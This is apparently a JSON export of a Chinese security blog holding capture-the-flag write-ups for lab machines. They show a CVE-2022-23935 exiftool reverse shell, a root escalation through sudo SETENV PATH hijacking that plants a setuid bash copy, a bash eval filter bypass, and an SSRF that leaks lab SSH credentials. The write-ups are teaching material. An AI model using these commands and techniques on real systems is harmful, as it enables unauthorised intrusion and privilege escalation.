sortedcontainers-2.4.0-py2.py3-none-any.whl (29 kB)\nUsing cached unicorn-2.1.1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (16.2 MB)\nUsing cached colored_traceback-0.4.2-py3-none-any.whl (5.5 kB)\nUsing cached packaging-24.2-py3-none-any.whl (65 kB)\nUsing cached PySocks-1.7.1-py3-none-any.whl (16 kB)\nUsing cached python_dateutil-2.9.0.post0-py2.py3-none-any.whl (229 kB)\nUsing cached rpyc-6.0.1-py3-none-any.whl (74 kB)\nUsing cached unix_ar-0.2.1-py2.py3-none-any.whl (6.5 kB)\nUsing cached zstandard-0.23.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (5.4 MB)\nUsing cached bcrypt-4.2.1-cp39-abi3-manylinux_2_28_x86_64.whl (278 kB)\nUsing cached certifi-2025.1.31-py3-none-any.whl (166 kB)\nUsing cached charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (145 kB)\nUsing cached cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl (4.2 MB)\nUsing cached idna-3.10-py3-none-any.whl (70 kB)\nUsing cached MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (23 kB)\nUsing cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)\nUsing cached urllib3-2.3.0-py3-none-any.whl (128 kB)\nUsing cached plumbum-1.9.0-py3-none-any.whl (127 kB)\nUsing cached cffi-1.17.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (479 kB)\nUsing cached pycparser-2.22-py3-none-any.whl (117 kB)\nInstalling collected packages: unicorn, sortedcontainers, pyserial, pyelftools, zstandard, urllib3, unix-ar, six, pysocks, pygments, pycparser, psutil, plumbum, packaging, MarkupSafe, intervaltree, idna, charset-normalizer, certifi, capstone, bcrypt, rpyc, ropgadget, requests, python-dateutil, mako, colored_traceback, cffi, pynacl, cryptography, paramiko, pwntools\nSuccessfully installed MarkupSafe-3.0.2 bcrypt-4.2.1 capstone-6.0.0a3 certifi-2025.1.31 cffi-1.17.1 charset-normalizer-3.4.1 colored_traceback-0.4.2 cryptography-44.0.0 idna-3.10 intervaltree-3.1.0 mako-1.3.9 packaging-24.2 paramiko-3.5.1 plumbum-1.9.0 psutil-6.1.1 pwntools-4.14.0 pycparser-2.22 pyelftools-0.31 pygments-2.19.1 pynacl-1.5.0 pyserial-3.5 pysocks-1.7.1 python-dateutil-2.9.0.post0 requests-2.32.3 ropgadget-7.6 rpyc-6.0.1 six-1.17.0 sortedcontainers-2.4.0 unicorn-2.1.1 unix-ar-0.2.1 urllib3-2.3.0 zstandard-0.23.0\n                                                                                                                                    \n\u250c\u2500\u2500(env)\u2500(kali\u327fkali)-[~/test/CVE-2022-23935]\n\u2514\u2500$ python3 CVE-2022-23935.py 192.168.205.128 8888\n/home/kali/test/CVE-2022-23935/CVE-2022-23935.py:14: SyntaxWarning: invalid escape sequence '\\ '\n  print('''\n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.12/update to 'never' (old way).\n    Or add the following lines to ~/.pwn.conf or /home/kali/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.0)\n[+] Connected!!!!\n\n   _____ __      __ ______      ___    ___  ___   ___        ___   ____    ___  ____   _____ \n  / ____|\\ \\    / /|  ____|    |__ \\  / _ \\|__ \\ |__ \\      |__ \\ |___ \\  / _ \\|___ \\ | ____|\n | |      \\ \\  / / | |__  ______  ) || | | |  ) |   ) |______  ) |  __) || (_) | __) || |__  \n | |       \\ \\/ /  |  __||______|/ / | | | | / /   / /|______|/ /  |__ <  \\__, ||__ < |___ \\ \n | |____    \\  /   | |____      / /_ | |_| |/ /_  / /_       / /_  ___) |   / / ___) | ___) |\n  \\_____|    \\/    |______|    |____| \\___/|____||____|     |____||____/   /_/ |____/ |____/       \n\n                                            by 0xFTW                                                                              \n      \n[+] Trying to bind to :: on port 8888: Done\n[+] Waiting for connections on :::8888: Got connection from ::ffff:192.168.205.131 on port 37880\n[*] Switching to interactive mode\nbash: cannot set terminal process group (376): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@w140:/var/www/uploads/1738979826$ $ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n![image-20250331185917326](https://7r1umphk.github.io/image/20250331185917403.png)\n\n# 3.\u63d0\u6743\n\n```\nwww-data@w140:/var/www/uploads/1738979826$ $ sudo -l\nsudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\nsudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper\nsudo: a password is required\nwww-data@w140:/var/www/uploads/1738979826$ $ cd ..\ncd ..\nwww-data@w140:/var/www/uploads$ $ ls -la\nls -la\ntotal 16\ndrwx------ 4 www-data root     4096 Feb  7 20:57 .\ndrwxr-xr-x 4 root     root     4096 Feb 21  2023 ..\ndrwxr-xr-x 2 www-data www-data 4096 Feb  7 20:51 1738979493\ndrwxr-xr-x 2 www-data www-data 4096 Feb  7 20:57 1738979826\nwww-data@w140:/var/www/uploads$ $ cd ..\ncd ..\nwww-data@w140:/var/www$ $ ls -al\nls -al\ntotal 48\ndrwxr-xr-x  4 root     root  4096 Feb 21  2023 .\ndrwxr-xr-x 12 root     root  4096 Jan 29  2023 ..\n-rw-r--r--  1 root     root 28744 Feb 21  2023 .w140.png\ndrwxr-xr-x  7 root     root  4096 Feb 14  2023 html\ndrwx------  4 www-data root  4096 Feb  7 20:57 uploads\n```\n\n\u6709\u4e2a\u56fe\u7247\u4f20\u8fc7\u6765\u770b\u770b\n\n![image-20250331185924540](https://7r1umphk.github.io/image/20250331185924622.png)\n\nqr\uff0c\u6211\u4eec\u8bc6\u522b\u4e00\u4e0b\n\n![image-20250331185931745](https://7r1umphk.github.io/image/20250331185931796.png)\n\n\u767b\u5f55\n\n```\nwww-data@w140:/var/www$ $ cd /home/\ncd /home/\nwww-data@w140:/home$ $ ls\nls\nghost\nwww-data@w140:/home$ $ su - ghost\nsu - ghost\nPassword: $ BaoeCblP5KGJDmA\n$ id\nuid=1000(ghost) gid=1000(ghost) groups=1000(ghost),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)\n$ sudo -l\nMatching Defaults entries for ghost on w140:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser ghost may run the following commands on w140:\n    (root) SETENV: NOPASSWD: /opt/Benz-w140\n```\n\n\u770b\u5230SETENV\uff0c\u6211\u5c31\u77e5\u9053\u662f\u73af\u5883\u53d8\u91cf\u52ab\u6301\u4e86\n\n```\n$ cd /opt/\n$ ls -la\ntotal 20\ndrwxr-xr-x  3 root root 4096 Feb 18  2023 .\ndrwxr-xr-x 18 root root 4096 Jan 29  2023 ..\n-rw-------  1 root root    5 Feb 18  2023 .bashre\n-rwxr-xr-x  1 root root  423 Feb 17  2023 Benz-w140\ndrwxr-xr-x  8 root root 4096 Dec  8  2021 exiftool\n$ cat /opt/Benz-w140\n                                                                                                             \n#!/bin/bash\n. /opt/.bashre\ncd /home/ghost/w140    \n\n# clean up log files\nif [ -s log/w140.log ] && ! [ -L log/w140.log ]\nthen\n/bin/cat log/w140.log > log/w140.log.old\n/usr/bin/truncate -s@ log/w140.log\nfi\n\n# protect the priceless originals\nfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;\n```\n\nfind\u6ca1\u6709\u7edd\u5bf9\u5730\u5740\uff0c\u6240\u4ee5\n\n```\n$ cd /tmp/\n$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' > find\n$ chmod +x find\n$ ls -la\ntotal 836\ndrwxrwxrwt  2 root     root       4096 Feb  7 21:11 .\ndrwxr-xr-x 18 root     root       4096 Jan 29  2023 ..\n-rwxr-xr-x  1 ghost    ghost        39 Feb  7 21:11 find\n-rwxr-xr-x  1 www-data www-data 839766 Jan 29 04:04 linpeas.sh\n$ cat find\ncp /bin/bash /tmp/sh;chmod u+s /tmp/sh\n$ sudo PATH=$PWD:$PATH /opt/Benz-w140\n/opt/Benz-w140: 4: cd: can't cd to /home/ghost/w140\n$ ls -la\ntotal 2044\ndrwxrwxrwt  2 root     root        4096 Feb  7 21:13 .\ndrwxr-xr-x 18 root     root        4096 Jan 29  2023 ..\n-rwxr-xr-x  1 ghost    ghost         39 Feb  7 21:11 find\n-rwxr-xr-x  1 www-data www-data  839766 Jan 29 04:04 linpeas.sh\n-rwsr-xr-x  1 root     root     1234376 Feb  7 21:13 sh\n$ /tmp/sh -p\n$ id\nuid=1000(ghost) gid=1000(ghost) euid=0(root) groups=1000(ghost),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)\n```\n\n\n\n<!-- ##{'timestamp':1739012133}## -->sentence", "top": 0, "createdAt": 1739012133, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-02-08", "dateLabelColor": "#0969da"}, "P13": {"htmlDir": "docs/post/qun-zhu-ti.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u7fa4\u4e3b\u9898", "postUrl": "post/qun-zhu-ti.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/13", "commentNum": 0, "wordCount": 1433, "description": "\u597d\u4e45\u6ca1\u6253\u8fc7\u9776\u673a\u4e86\uff0c\u4e5f\u6ca1\u66f4\u65b0\u8fc7\uff0c\u4eca\u5929\u5728\u7fa4\u91cc\u770b\u5230\u4e86\u7fa4\u4e3b\u53d1\u4e86\u4e00\u4e2a\u9898\u76ee\u5c31\u73a9\u4e86\u4e00\u4e0b\uff0c\u987a\u4fbf\u6c34\u4e00\u671fwp\n\n\u9898\u76ee\uff1a\n\n![image-20250322153403638](https://7r1umphk.github.io/image/20250322153403675.png)\n\n```\nPATH=/usr/bin\nread INPUT < <(head -n1 | tr -d '[A-Za-z0-9/]')\neval '$INPUT'\n```\n\n\u6d45\u7784\u4e86\u4e00\u773c\uff0c\u53d1\u73b0tr\u5220\u9664\u4e86\u6240\u6709\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u659c\u6760\uff0c\u4f46\u4fdd\u7559\u7279\u6b8a\u7b26\u53f7\uff0c\u90a3\u5c31\u6709\u641e\u5934\n\nps:$@ \u5728 Shell \u4e2d\u8868\u793a\u811a\u672c\u7684\u6240\u6709\u53c2\u6570\uff0c\u53ef\u88ab eval \u89e3\u6790\u3002\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u8f93\u5165$@\uff0c\u7ed5\u8fc7\u5b57\u7b26\u8fc7\u6ee4\u3002\u7136\u540e\u518d\u4f20\u9012\u53c2\u6570bash -p\u542f\u52a8\u7279\u6743Shell\u3002\n\n\u89e3\u6cd5\uff1a\n\n```\necho '$@' | ./a.sh 'bash -p'\n```\n\n\u4f46\u662f\u6211\u7684\u4e0d\u662f\u9884\u671f\u89e3\n\n![image-20250322153428456](https://7r1umphk.github.io/image/20250322153428487.png)\n\n![image-20250322153442791](https://7r1umphk.github.io/image/20250322153442822.png)\n\n\u8fd9\u4e24\u4e2a\u662f\u9884\u671f\u7684\n\n\u7136\u540e.....\n\n![image-20250322153453994](https://7r1umphk.github.io/image/20250322153454035.png)\n\n\u52a0\u5f3a\u7248\uff1a\n\n```\n#!/bin/bash\n\nPATH=/usr/bin\n\na=$((RANDOM%100))\n\necho $a\n\nread -r INPUTS\n\n\nif [[ '$INPUTS' -ne '$a' ]]; then\n    exit 1\nfi\n\nread INPUT < <(head -n1 | tr -d '[A-Za-z0-9/]')\neval '$INPUT'\n```\n\n\u52a0\u4e86\u4e00\u4e2a\u968f\u673a\u6570\uff0c\u6211\u672c\u8eab\u662f\u8bf4\u7206\u7834\u7684......\n\n![image-20250322153509806](https://7r1umphk.github.io/image/20250322153509848.png)\n\n\u7136\u540e\u540e\u9762\u6709\u7a7a\u7784\u4e86\u51e0\u773c\uff0c\u56e0\u4e3a\u6211\u77e5\u9053\u5b83\u5728\u8fdb\u884c\u6574\u6570\u7684\u6bd4\u8f83\uff0c\u90a3\u6211\u5c31\u5728\u60f3\u5982\u679c\u8f93\u5165\u4e00\u4e2a\u975e\u6574\u6570\u4f1a\u600e\u4e48\u6837\uff0c\u7136\u540e......\n\n![image-20250322153523210](https://7r1umphk.github.io/image/20250322153523241.png)\n\n\u6709\u620f\n\n![image-20250322153725388](https://7r1umphk.github.io/image/20250322153725419.png)\n\n\u7136\u540e\u6211\u540e\u9762\u6211\u60f3\u627e\u4e00\u4e0b\u8fd9\u65b9\u9762\u7684\u8d44\u6599\uff0c\u4f46\u662f\u6211\u6ca1\u627e\u5230\uff0c\u6211\u6253\u7b97\u660e\u5929\u518d\u53bb\u95ee\u95ee\u7fa4\u4e3b\uff0c\u56e0\u4e3a\u4ed6bash\u6bd4\u8f83\u597d\uff08\u4e0d\u8fc7\u6211\u611f\u89c9\u4ed6\u4f1a\u81ea\u5df1\u6765\u770b\u6211\u7684wp\uff09\n\n\u76ee\u524d\u6211\u7684\u7406\u89e3\u662f\u5f53\u4f7f\u7528-ne\u6bd4\u8f83\u975e\u6570\u5b57\u5b57\u7b26\u4e32\u65f6\uff0cBash\u4f1a\u5c1d\u8bd5\u5c06\u4e24\u8fb9\u8f6c\u6362\u4e3a\u6574\u6570\u3002\u5982\u679c\u8f6c\u6362\u5931\u8d25\uff0c\u5c31\u4f1a\u62a5\u9519\u4ec0\u4e48\u7684\uff0c[[ ]]\u8868\u8fbe\u5f0f\u7684\u7ed3\u679c\u4f1a\u88ab\u89c6\u4e3afalse\uff0c\u56e0\u4e3a\u6bd4\u8f83\u64cd\u4f5c\u672c\u8eab\u65e0\u6548\uff0c\u5bfc\u81f4\u6574\u4e2a\u6761\u4ef6\u5224\u65ad\u4e3a\u5047\uff0c\u56e0\u6b64\u4e0d\u6267\u884cexit 1\u3002\n\n\n\n\u4e0d\u7ba1\u4e86\uff0c\u7761\u89c9\uff0c\u7b49\u7fa4\u4e3b\u7ed9\u6211\u89e3\u60d1\u4e86\n\n<!-- ##{'timestamp':1740728321}## -->sentence", "top": 0, "createdAt": 1740728321, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-02-28", "dateLabelColor": "#0969da"}, "P1": {"htmlDir": "docs/post/hello world.html", "labels": ["\u5439\u6c34"], "postTitle": "hello world", "postUrl": "post/hello%20world.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/1", "commentNum": 0, "wordCount": 11, "description": "hello worldsentence", "top": 0, "createdAt": 1751015728, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P2": {"htmlDir": "docs/post/hmv_jan.html", "labels": ["HackMyVM"], "postTitle": "hmv_jan", "postUrl": "post/hmv_jan.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/2", "commentNum": 0, "wordCount": 13580, "description": "# 0.\u7b80\u4ecb\n\n\u9776\u673a\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=jan\n \u96be\u5ea6\uff1a\u7eff\u8272\n \u76ee\u6807 IP\uff1a192.168.205.136\n \u672c\u673a IP\uff1a192.168.205.128\n\n# 1.\u626b\u63cf\n\nnmap\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A 192.168.205.136\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:40 CST\nNmap scan report for 192.168.205.136\nHost is up (0.00023s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)\n| ssh-hostkey: \n|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)\n|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)\n8080/tcp open  http    Golang net/http server\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n| fingerprint-strings: \n|   FourOhFourRequest, GetRequest, HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Date: Mon, 03 Feb 2025 04:40:49 GMT\n|     Content-Length: 45\n|     Content-Type: text/plain; charset=utf-8\n|     Welcome to our Public Server. Maybe Internal.\n|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   OfficeScan: \n|     HTTP/1.1 400 Bad Request: missing required Host header\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|_    Request: missing required Host header\n|_http-open-proxy: Proxy might be redirecting requests\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.95%I=7%D=2/3%Time=67A048E1%P=x86_64-pc-linux-gnu%r(Get\nSF:Request,A2,'HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x2003\\x20Feb\\x20202\nSF:5\\x2004:40:49\\x20GMT\\r\\nContent-Length:\\x2045\\r\\nContent-Type:\\x20text/\nSF:plain;\\x20charset=utf-8\\r\\n\\r\\nWelcome\\x20to\\x20our\\x20Public\\x20Server\nSF:\\.\\x20Maybe\\x20Internal\\.')%r(HTTPOptions,A2,'HTTP/1\\.0\\x20200\\x20OK\\r\\\nSF:nDate:\\x20Mon,\\x2003\\x20Feb\\x202025\\x2004:40:49\\x20GMT\\r\\nContent-Lengt\nSF:h:\\x2045\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\nWelcom\nSF:e\\x20to\\x20our\\x20Public\\x20Server\\.\\x20Maybe\\x20Internal\\.')%r(RTSPReq\nSF:uest,67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/pl\nSF:ain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Requ\nSF:est')%r(FourOhFourRequest,A2,'HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x\nSF:2003\\x20Feb\\x202025\\x2004:40:49\\x20GMT\\r\\nContent-Length:\\x2045\\r\\nCont\nSF:ent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\nWelcome\\x20to\\x20our\\x\nSF:20Public\\x20Server\\.\\x20Maybe\\x20Internal\\.')%r(Socks5,67,'HTTP/1\\.1\\x2\nSF:0400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\nSF:\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request')%r(GenericLines,\nSF:67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\\nSF:x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request')\nSF:%r(Help,67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text\nSF:/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20R\nSF:equest')%r(SSLSessionReq,67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCont\nSF:ent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\nSF:\\n400\\x20Bad\\x20Request')%r(LPDString,67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Re\nSF:quest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x\nSF:20close\\r\\n\\r\\n400\\x20Bad\\x20Request')%r(SIPOptions,67,'HTTP/1\\.1\\x2040\nSF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\\nSF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request')%r(OfficeScan,A3,'H\nSF:TTP/1\\.1\\x20400\\x20Bad\\x20Request:\\x20missing\\x20required\\x20Host\\x20he\nSF:ader\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x2\nSF:0close\\r\\n\\r\\n400\\x20Bad\\x20Request:\\x20missing\\x20required\\x20Host\\x20\nSF:header');\nMAC Address: 08:00:27:3A:49:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.23 ms 192.168.205.136\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 28.01 seconds\n                                                                             \n```\n\n8080\u7aef\u53e3sT\u548csS\u53c2\u6570\u63a2\u6d4b\u4e0d\u51fa\u6765\uff0c\u6240\u4ee5\u5efa\u8bae\u4e0d\u4f7f\u7528\n\n# 2.\u8e29\u70b9\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/                            \nWelcome to our Public Server. Maybe Internal.                                                                                                                                    \n```\n\n\u8fdb\u884c\u76ee\u5f55\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ feroxbuster -u http://192.168.205.136:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt\n                                                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben 'epi' Risher \ud83e\udd13                 ver: 2.11.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://192.168.205.136:8080\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.11.0\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83d\udcb2  Extensions            \u2502 [php, html, md, txt]\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n200      GET        1l        7w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   \n400      GET        1l        3w       24c http://192.168.205.136:8080/redirect\n200      GET        2l        2w       16c http://192.168.205.136:8080/robots.txt\n[####################] - 54s   598005/598005  0s      found:2       errors:0    \n[####################] - 54s   598005/598005  11090/s http://192.168.205.136:8080/           \n```\n\n\u63a2\u7d22\u4e00\u6ce2\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/redirect\nParameter 'url' needed.\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/robots.txt\n/redirect\n/credz                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/credz   \nOnly accessible internally.                                                                                                                                    \n```\n\n\u76ee\u524d\u6765\u770b\u51fa\u9898\u601d\u8def\u662f\u901a\u8fc7/redirect\u8bbf\u95ee/credz\uff0c\u8fdb\u884c\u5c1d\u8bd5\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/credz   \nOnly accessible internally.                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt\nOnly accessible internally.                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl -I http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt\nHTTP/1.1 200 OK\nDate: Mon, 03 Feb 2025 04:47:07 GMT\nContent-Length: 27\nContent-Type: text/plain; charset=utf-8\n```\n\n\u8fd9\u91cc\u6211\u6d4b\u8bd5\u4e86\u633a\u591a\u7ed5\u8fc7\u68c0\u6d4b\u7684\u65b9\u6cd5\uff0c\u6211\u5c31\u4e0d\u5199\u51fa\u6765\u4e86\uff0c\u6b63\u786e\u65b9\u6cd5\u662f\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=192.168.205.136:8080/credz'\n                                         \n```\n\n\u8fd4\u56de\u7a7a\u767d\uff0c\u7a7a\u767d\u5c31\u662f\u6709\u673a\u53ef\u5bfb\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=127.0.0.1:8080/credz'\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=/credz'            \nssh/EazyLOL                                                                                                                                     \n```\n\n\u767b\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh ssh@192.168.205.136\nThe authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.\nED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:3: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.\nssh@192.168.205.136's password: \nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee <https://wiki.alpinelinux.org/>.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\njan:~$ id\nuid=1000(ssh) gid=1000(ssh) groups=1000(ssh)\n```\n\n# 4.\u63d0\u6743\n\n```\njan:~$ ls -al\ntotal 12\ndrwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .\ndrwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..\nlrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -> /dev/null\n-rw-------    1 ssh      ssh             22 Jan 28 09:20 user.txt\njan:~$ sudo -l\nMatching Defaults entries for ssh on jan:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults for ssh:\n    Defaults!/usr/sbin/visudo 